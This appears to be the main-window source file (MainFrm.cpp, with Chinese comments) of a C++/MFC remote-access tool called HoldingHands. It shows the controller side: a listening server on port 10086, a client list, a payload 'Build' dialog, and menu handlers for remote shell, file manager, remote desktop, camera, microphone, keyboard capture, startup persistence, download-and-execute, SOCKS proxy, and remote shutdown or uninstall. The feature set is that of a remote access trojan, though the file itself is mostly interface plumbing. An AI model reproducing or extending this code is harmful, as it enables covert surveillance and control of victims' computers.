
// MainFrm.cpp : CMainFrame 类的实现
//

#include "stdafx.h"
#include "HoldingHands.h"
#include "IOCPServer.h"
#include "MainFrm.h"
#include "Manager.h"
#include "ClientContext.h"
#include "BuildDlg.h"
#include "SettingDlg.h"
#include "utils.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

// CMainFrame

IMPLEMENT_DYNAMIC(CMainFrame, CFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
	ON_WM_CREATE()
	ON_WM_SETFOCUS()
	ON_WM_PAINT()

	ON_WM_TIMER()
	ON_COMMAND(ID_MAIN_STARTSERVER, &CMainFrame::OnMainStartserver)
	ON_UPDATE_COMMAND_UI(ID_MAIN_STARTSERVER, &CMainFrame::OnUpdateMainStartserver)

	ON_MESSAGE(WM_IOCP_SRV_START, OnSrvStarted)
	ON_MESSAGE(WM_IOCP_SRV_CLOSE, OnSrvStopped)

	//创建Handler对象
	ON_MESSAGE(WM_SOCKET_CONNECT,OnSocketConnect)
	ON_MESSAGE(WM_SOCKET_CLOSE, OnSocketClose)
	//ON_MESSAGE()
	ON_WM_CLOSE()
	ON_COMMAND(ID_MAIN_EXIT, &CMainFrame::OnMainExit)
	//不在MainFrame里面加始终是灰色的.
	ON_COMMAND(ID_SESSION_DISCONNECT, &CMainFrame::OnSessionDisconnect)
	ON_COMMAND(ID_SESSION_UNINSTALL, &CMainFrame::OnSessionUninstall)
	ON_COMMAND(ID_POWER_SHUTDOWN, &CMainFrame::OnPowerShutdown)
	ON_COMMAND(ID_POWER_REBOOT, &CMainFrame::OnPowerReboot)
	ON_COMMAND(ID_OPERATION_EDITCOMMENT, &CMainFrame::OnOperationEditcomment)
	ON_UPDATE_COMMAND_UI(ID_MAIN_EXIT, &CMainFrame::OnUpdateMainExit)
	ON_COMMAND(ID_OPERATION_CMD, &CMainFrame::OnOperationCmd)
	ON_COMMAND(ID_OPERATION_CHATBOX, &CMainFrame::OnOperationChatbox)
	ON_COMMAND(ID_OPERATION_FILEMANAGER, &CMainFrame::OnOperationFilemanager)
	ON_COMMAND(ID_OPERATION_REMOTEDESKTOP, &CMainFrame::OnOperationRemotedesktop)
	ON_COMMAND(ID_OPERATION_CAMERA, &CMainFrame::OnOperationCamera)
	ON_COMMAND(ID_SESSION_RESTART, &CMainFrame::OnSessionRestart)
	ON_COMMAND(ID_OPERATION_MICROPHONE, &CMainFrame::OnOperationMicrophone)
	ON_COMMAND(ID_MAIN_BUILD, &CMainFrame::OnMainBuild)
	ON_COMMAND(ID_MAIN_SETTINGS, &CMainFrame::OnMainSettings)
	ON_COMMAND(ID_OPERATION_KEYBOARD, &CMainFrame::OnOperationKeyboard)
	ON_COMMAND(ID_UTILS_ADDTO, &CMainFrame::OnUtilsAddto)
	ON_COMMAND(ID_UTILS_COPYTOSTARTUP, &CMainFrame::OnUtilsCopytostartup)
	ON_COMMAND(ID_UTILS_DOWNLOADANDEXEC, &CMainFrame::OnUtilsDownloadandexec)
	ON_COMMAND(ID_PROXY_SOCKSPROXY, &CMainFrame::OnProxySocksproxy)
	ON_COMMAND(ID_SESSION_EXIT, &CMainFrame::OnSessionExit)
END_MESSAGE_MAP()

static UINT indicators[] =
{
	ID_SERVER_STATU,
	ID_HOST_COUNT,
	ID_HOST_SELECTED,
	ID_UPLOAD_SPEED,
	ID_DOWNLOAD_SPEED,
	ID_CUR_DATE
};

// CMainFrame 构造/析构

CMainFrame::CMainFrame()
{
	// TODO:  在此添加成员初始化代码
	m_View = 0;
	m_pServer = NULL;
	m_bExitAfterStop = FALSE;
	m_listenPort = 10086;

	m_pServer = NULL;
	m_pManager = NULL;

	TCHAR szPath[MAX_PATH];
	GetProcessDirectory(szPath);
	CString strPath(szPath);
	strPath += "\\config\\config.json";
	m_config.LoadConfig(CW2A(strPath).m_psz);
}

CMainFrame::~CMainFrame()
{
	//释放资源..
	CIOCPServer::DeleteServer();
	if (m_pManager){
		delete m_pManager;
	}

	TCHAR szPath[MAX_PATH];
	GetProcessDirectory(szPath);
	CString strPath(szPath);
	strPath += "\\config\\config.json";
	m_config.SaveConfig(CW2A(strPath).m_psz);
}

TCHAR* szSrvStatu[] =
{
	TEXT("Starting"),
	TEXT("Running"),
	TEXT("Stopping"),
	TEXT("Stopped"),
};

int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;
	RECT rect = { 0 };
	//创建状态栏
	if (!m_wndStatusBar.Create(this)){
		TRACE0("未能创建StatuBar\n");
		return -1;      // 未能创建
	}
	m_wndStatusBar.SetIndicators(indicators, sizeof(indicators) / sizeof(UINT));
	m_wndStatusBar.SetPaneInfo(0, ID_SERVER_STATU, SBPS_STRETCH, 0);
	m_wndStatusBar.SetPaneInfo(1, ID_HOST_COUNT, SBPS_NORMAL, 110);
	m_wndStatusBar.SetPaneInfo(2, ID_HOST_SELECTED, SBPS_NORMAL, 110);
	m_wndStatusBar.SetPaneInfo(3, ID_UPLOAD_SPEED, SBPS_NORMAL, 180);
	m_wndStatusBar.SetPaneInfo(4, ID_DOWNLOAD_SPEED, SBPS_NORMAL, 180);
	m_wndStatusBar.SetPaneInfo(5, ID_CUR_DATE, SBPS_NORMAL, 160);

	if (!m_ClientList.Create(WS_CHILD | WS_VISIBLE | WS_BORDER | LVS_REPORT,
		rect, this, NULL))
	{
		TRACE0("未能创建ClientList\n");
		return -1;      // 未能创建
	}

	m_View |= (VIEW_SHOW_CLIENLIST);
	m_ServerStatu = SRV_STATU_STOPPED;

	m_pManager = new CManager(m_hWnd);
	m_pServer = CIOCPServer::CreateServer(m_pManager);
	
	//用于刷新数据的计时器
	SetTimer(10086, 1000, NULL);
	//
	SetIcon(AfxGetApp()->LoadIcon(IDR_MAINFRAME),TRUE);
	SetIcon(AfxGetApp()->LoadIcon(IDR_MAINFRAME), TRUE);
	return 0;
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if( !CFrameWnd::PreCreateWindow(cs) )
		return FALSE;
	// TODO:  在此处通过修改
	//  CREATESTRUCT cs 来修改窗口类或样式

	cs.style |= (CS_HREDRAW | CS_VREDRAW);
	cs.dwExStyle &= ~WS_EX_CLIENTEDGE;
	cs.lpszClass = AfxRegisterWndClass(0);
	cs.lpszName = TEXT("[HoldingHands]");
	
	return TRUE;
}

// CMainFrame 诊断

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
	CFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CFrameWnd::Dump(dc);
}
#endif //_DEBUG


// CMainFrame 消息处理程序

void CMainFrame::OnSetFocus(CWnd* /*pOldWnd*/)
{
	
}

void CMainFrame::OnPaint()
{
	CPaintDC dc(this); // device context for painting
	// TODO:  在此处添加消息处理程序代码
	// 不为绘图消息调用 CFrameWnd::OnPaint()
	RECT rect;
	RECT StatuBarRect;
	//
	m_wndStatusBar.GetClientRect(&StatuBarRect);
	GetClientRect(&rect);
	rect.bottom -= (StatuBarRect.bottom - StatuBarRect.top);
	m_ClientList.MoveWindow(&rect);
	m_ClientList.ShowWindow(SW_SHOW);
}


void CMainFrame::OnUpdateStatuBar()
{
	//更新时间
	CString PaneText;
	CTime time = CTime::GetTickCount();
	PaneText = time.Format("[%Y-%m-%d %H:%M:%S]");
	m_wndStatusBar.SetPaneText(5, PaneText);
	//更新上传,下载速度.
	LARGE_INTEGER liReadSpeed, liWriteSpeed;
	liReadSpeed.QuadPart = 0, liWriteSpeed.QuadPart = 0;
	TCHAR szReadSpeed[128], szWriteSpeed[128];

	if (m_pServer){
		m_pServer->GetSpeed(&liReadSpeed.LowPart, &liWriteSpeed.LowPart);
	}

	GetStorageSizeString(liReadSpeed,szReadSpeed);
	GetStorageSizeString(liWriteSpeed, szWriteSpeed);

	PaneText.Format(TEXT("Upload: %s/S"), szWriteSpeed);
	m_wndStatusBar.SetPaneText(3, PaneText);

	PaneText.Format(TEXT("Download: %s/s"), szReadSpeed);
	m_wndStatusBar.SetPaneText(4, PaneText);



	//HostCount
	PaneText.Format(TEXT("Host: %d"), m_ClientList.GetItemCount());
	m_wndStatusBar.SetPaneText(1, PaneText);
	//Selected Count
	PaneText.Format(TEXT("Selected: %d"), m_ClientList.GetSelectedCount());
	m_wndStatusBar.SetPaneText(2, PaneText);
	//ServerStatu

	PaneText.Format(TEXT("ServerStatu: %s"), szSrvStatu[m_ServerStatu]);
	m_wndStatusBar.SetPaneText(0, PaneText);
}
void CMainFrame::OnTimer(UINT_PTR nIDEvent)
{
	// TODO:  在此添加消息处理程序代码和/或调用默认值
	//
	switch (nIDEvent)
	{
	case 10086:
		OnUpdateStatuBar();
		break;
	default:
		break;
	}
	CFrameWnd::OnTimer(nIDEvent);
}


void CMainFrame::OnMainStartserver()
{
	// TODO:  在此添加命令处理程序代码
	if (m_ServerStatu == SRV_STATU_STARTED){
		m_ServerStatu = SRV_STATU_STOPPING;
		//移除所有客户端
		m_ClientList.DeleteAllItems();
		m_pServer->AsyncStopSrv(m_hWnd);
	}
	if (m_ServerStatu == SRV_STATU_STOPPED){
		m_ServerStatu = SRV_STATU_STARTING;
		m_pServer->AsyncStartSrv(m_hWnd,m_listenPort);
	}
}


void CMainFrame::OnUpdateMainStartserver(CCmdUI *pCmdUI)
{
	// TODO:  在此添加命令更新用户界面处理程序代码
	switch (m_ServerStatu)
	{
	case SRV_STATU_STARTED:
		pCmdUI->SetText(L"Stop");
		pCmdUI->Enable();
		break;
	case SRV_STATU_STARTING:
		pCmdUI->SetText(L"Starting");
		pCmdUI->Enable(0);
		break;
	case SRV_STATU_STOPPED:
		pCmdUI->SetText(L"Start");
		pCmdUI->Enable();
		break;
	case SRV_STATU_STOPPING:
		pCmdUI->SetText(L"Stopping");
		pCmdUI->Enable(0);
		break;
	}
}

void CMainFrame::OnMainExit()
{
	// TODO:  在此添加命令处理程序代码
	CMainFrame::OnClose();
}

void CMainFrame::OnClose()
{
	if (IDYES != MessageBox(L"Are you sure?", L"Exit", MB_YESNO))
		return;
	//关闭服务器.(如果已经关闭了也没事,也会继续通知的)
	m_ServerStatu = SRV_STATU_STOPPING;
	m_bExitAfterStop = TRUE;
	m_pServer->AsyncStopSrv(m_hWnd);
}



/*****************************************************************************************************
					服务器的通知
******************************************************************************************************/
LRESULT CMainFrame::OnSrvStarted(WPARAM wParam,LPARAM lParam)
{
	if (wParam == 0){
		MessageBox(TEXT("Start Server Failed"), TEXT("Tips"), MB_OK | MB_ICONINFORMATION);
		m_ServerStatu = SRV_STATU_STOPPED;
	}
	else{
		/*Log(L"Server is Running.");*/
		m_ServerStatu = SRV_STATU_STARTED;
	}
	return 0;
}

LRESULT CMainFrame::OnSrvStopped(WPARAM wParam, LPARAM lParam)
{
	m_ServerStatu = SRV_STATU_STOPPED;
	/*Log(L"Server has stopped.");*/
	//退出程序
	if (m_bExitAfterStop){

		m_pServer = NULL;
		KillTimer(10086);
		//clean:
		DestroyWindow();
	}
	return 0;
}


/********************************************************************************
							** 创建Handler对象 **
	当socket第一次连接的时候,会根据Identity 创建一个Handler,由于可能涉及窗口,所以在
	主线程里面执行初始化操作

********************************************************************************/

LRESULT CMainFrame::OnSocketConnect(WPARAM wParam, LPARAM lParam){
	CClientContext*pContext = (CClientContext*)wParam;
	return m_pServer->GetMsgManager()->handler_init(pContext, lParam);
}

LRESULT CMainFrame::OnSocketClose(WPARAM wParam, LPARAM lParam){
	CClientContext*pContext = (CClientContext*)wParam;
	return m_pServer->GetMsgManager()->handler_term(pContext, lParam);
}

//不在MainFrame里面加消息映射,菜单始终是灰色的mmp.
void CMainFrame::OnSessionDisconnect(){
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_SESSION_DISCONNECT, 0);
}
void CMainFrame::OnSessionUninstall(){
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_SESSION_UNINSTALL, 0);
}
void CMainFrame::OnPowerShutdown(){
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_POWER_SHUTDOWN, 0);
}
void CMainFrame::OnPowerReboot(){
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_POWER_REBOOT, 0);
}
void CMainFrame::OnOperationEditcomment(){
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_EDITCOMMENT, 0);
}

void CMainFrame::OnUpdateMainExit(CCmdUI *pCmdUI)
{
	// TODO:  在此添加命令更新用户界面处理程序代码
	pCmdUI->Enable(!(m_ServerStatu == SRV_STATU_STOPPING));
}


void CMainFrame::OnOperationCmd()
{
	// TODO:  在此添加命令处理程序代码
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_CMD, 0);
}


void CMainFrame::OnOperationChatbox()
{
	// TODO:  在此添加命令处理程序代码
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_CHATBOX, 0);
}

void CMainFrame::OnOperationFilemanager()
{
	// TODO:  在此添加命令处理程序代码
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_FILEMANAGER, 0);
}


void CMainFrame::OnOperationRemotedesktop()
{
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_REMOTEDESKTOP, 0);
}


void CMainFrame::OnOperationCamera()
{
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_CAMERA, 0);
}


void CMainFrame::OnSessionRestart()
{
	// TODO:  在此添加命令处理程序代码
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_SESSION_RESTART, 0);
}


void CMainFrame::OnOperationMicrophone()
{
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_MICROPHONE, 0);
}



void CMainFrame::OnMainBuild(){
	CBuildDlg dlg;
	dlg.DoModal();
}


void CMainFrame::OnMainSettings(){
	CSettingDlg dlg(m_config,this);
	dlg.DoModal();
}


void CMainFrame::OnOperationKeyboard(){
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_KEYBOARD, 0);
}


void CMainFrame::OnUtilsAddto()
{
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_UTILS_ADDTO, 0);
}


void CMainFrame::OnUtilsCopytostartup()
{
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_UTILS_COPYTOSTARTUP, 0);
}


void CMainFrame::OnUtilsDownloadandexec()
{
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_UTILS_DOWNLOADANDEXEC, 0);
}


void CMainFrame::OnProxySocksproxy()
{
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_PROXY_SOCKSPROXY, 0);
}


void CMainFrame::OnSessionExit()
{
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_SESSION_EXIT, 0);
}
